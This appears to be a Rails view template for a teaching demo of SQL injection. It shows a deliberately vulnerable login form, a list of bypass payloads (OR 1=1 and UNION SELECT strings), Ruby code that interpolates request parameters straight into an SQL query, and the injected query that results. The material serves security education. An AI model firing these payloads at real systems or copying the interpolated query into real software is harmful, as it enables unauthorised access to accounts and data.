<div class="container mt-4">
  <h2>Classic SQL Injection Demo</h2>
  <div class="alert alert-warning">
    <strong>Cảnh báo:</strong> Đây là demo lỗ hổng bảo mật. Chỉ sử dụng cho mục đích học tập!
  </div>
  
  <div class="row">
    <div class="col-md-6">
      <h4>Login Form (Vulnerable)</h4>
      <%= form_with url: sessions_path, method: :post, local: true, class: "border p-3 bg-light" do |f| %>
        <div class="mb-3">
          <%= f.label :email, "Email:", class: "form-label" %>
          <%= f.text_field :email, class: "form-control", placeholder: "Thử: admin@example.com' OR '1'='1' --" %>
        </div>
        
        <div class="mb-3">
          <%= f.label :password, "Password:", class: "form-label" %>
          <%= f.password_field :password, class: "form-control", placeholder: "anything" %>
        </div>
        
        <%= f.submit "Login", class: "btn btn-primary" %>
      <% end %>
    </div>
    
    <div class="col-md-6">
      <h4>Payloads để test:</h4>
      <div class="list-group">
        <div class="list-group-item">
          <strong>Classic bypass:</strong><br>
          <code>admin@example.com' OR '1'='1' --</code>
        </div>
        
        <div class="list-group-item">
          <strong>Comment bypass:</strong><br>
          <code>' OR 1=1 #</code>
        </div>
        
        <div class="list-group-item">
          <strong>Union bypass:</strong><br>
          <code>' UNION SELECT 1,'admin@test.com','password' --</code>
        </div>
      </div>
    </div>
  </div>
  
  <div class="mt-4">
    <h4>Code vulnerable hiện tại:</h4>
    <pre class="bg-dark text-light p-3"><code>email = params[:email]
pass  = params[:password]
sql = "SELECT * FROM users WHERE email='#{email}' AND password_digest='#{pass}' LIMIT 1"
user = User.find_by_sql(sql).first</code></pre>
  </div>
  
  <div class="mt-3">
    <h4>SQL Query sẽ được tạo ra:</h4>
    <pre class="bg-warning p-3"><code>SELECT * FROM users WHERE email='admin@example.com' OR '1'='1' --' AND password_digest='anything' LIMIT 1</code></pre>
  </div>
</div>
